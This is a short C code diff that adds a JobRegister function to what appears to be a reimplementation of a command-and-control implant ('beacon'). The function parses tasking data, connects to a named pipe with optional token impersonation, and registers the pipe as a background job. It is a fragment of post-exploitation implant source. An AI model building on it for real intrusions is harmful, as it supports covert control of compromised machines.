@@ -1,6 +1,7 @@
 #include "pch.h"
 
 #include "beacon.h"
+#include "pipe.h"
 
 
 typedef struct _JOB_ENTRY
@@ -159,4 +160,43 @@ JOB_ENTRY* JobRegisterPipe(HANDLE hRead, int pid32, int callbackType, char* desc
 	strncpy(job->description, description, sizeof(job->description));
 
 	return JobAdd(job);
+}
+
+void JobRegister(char* buffer, int size, BOOL impersonate, BOOL isMsgMode)
+{
+	char filename[64] = { 0 };
+	char description[64] = { 0 };
+
+	datap parser;
+	BeaconDataParse(&parser, buffer, size);
+	int pid32 = BeaconDataInt(&parser);
+	short callbackType = BeaconDataShort(&parser);
+	short waitTime = BeaconDataShort(&parser);
+
+	if (!BeaconDataStringCopySafe(&parser, filename, sizeof(filename)))
+		return;
+
+	if (!BeaconDataStringCopySafe(&parser, description, sizeof(description)))
+		return;
+
+	HANDLE hPipe;
+	int attempts = 0;
+	while (!PipeConnectWithToken(filename, &hPipe, impersonate ? 0x20000 : 0))
+	{
+		Sleep(500);
+		if(++attempts >= 20)
+		{
+			DWORD lastError = GetLastError();
+			LERROR("Could not connect to pipe: %s", LAST_ERROR_STR(lastError));
+			BeaconErrorD(ERROR_CONNECT_TO_PIPE_FAILED, lastError);
+			return;
+		}
+	}
+
+	if (waitTime)
+	{
+		PipeWaitForData(hPipe, waitTime, 500);
+	}
+
+	JobRegisterPipe(hPipe, pid32, callbackType, description, isMsgMode);
 }
